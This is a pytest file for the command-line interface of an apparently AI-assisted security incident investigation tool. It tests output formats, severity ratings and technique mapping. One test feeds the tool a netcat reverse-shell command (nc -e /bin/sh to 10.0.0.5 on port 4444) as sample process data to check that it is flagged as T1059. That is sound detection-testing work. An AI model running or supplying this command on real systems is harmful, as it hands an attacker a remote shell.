import json
from pathlib import Path

import pytest

from soc_agent.cli import main

SAMPLE_INCIDENT_PATH = str(Path(__file__).resolve().parent.parent / "examples" / "sample_incident.txt")


@pytest.fixture(autouse=True)
def _no_api_key(monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)


def test_cli_human_output(capsys):
    exit_code = main(["investigate", "--file", SAMPLE_INCIDENT_PATH])
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "CRITICAL" in captured.out
    assert "Recommended actions" in captured.out


def test_cli_json_output(capsys):
    exit_code = main(["investigate", "--file", SAMPLE_INCIDENT_PATH, "--json"])
    captured = capsys.readouterr()
    assert exit_code == 0
    payload = json.loads(captured.out)
    assert payload["severity"] == "critical"
    assert payload["llm_backed"] is False
    assert isinstance(payload["trace"], list) and len(payload["trace"]) > 0


def test_cli_with_processes_flag(capsys):
    exit_code = main(
        [
            "investigate",
            "--file",
            SAMPLE_INCIDENT_PATH,
            "--processes",
            "nc -e /bin/sh 10.0.0.5 4444,bash",
            "--json",
        ]
    )
    captured = capsys.readouterr()
    assert exit_code == 0
    payload = json.loads(captured.out)
    assert "T1059" in payload["technique_ids"]


def test_cli_missing_input_raises(monkeypatch):
    monkeypatch.setattr("sys.stdin.isatty", lambda: True)
    with pytest.raises(SystemExit):
        main(["investigate"])
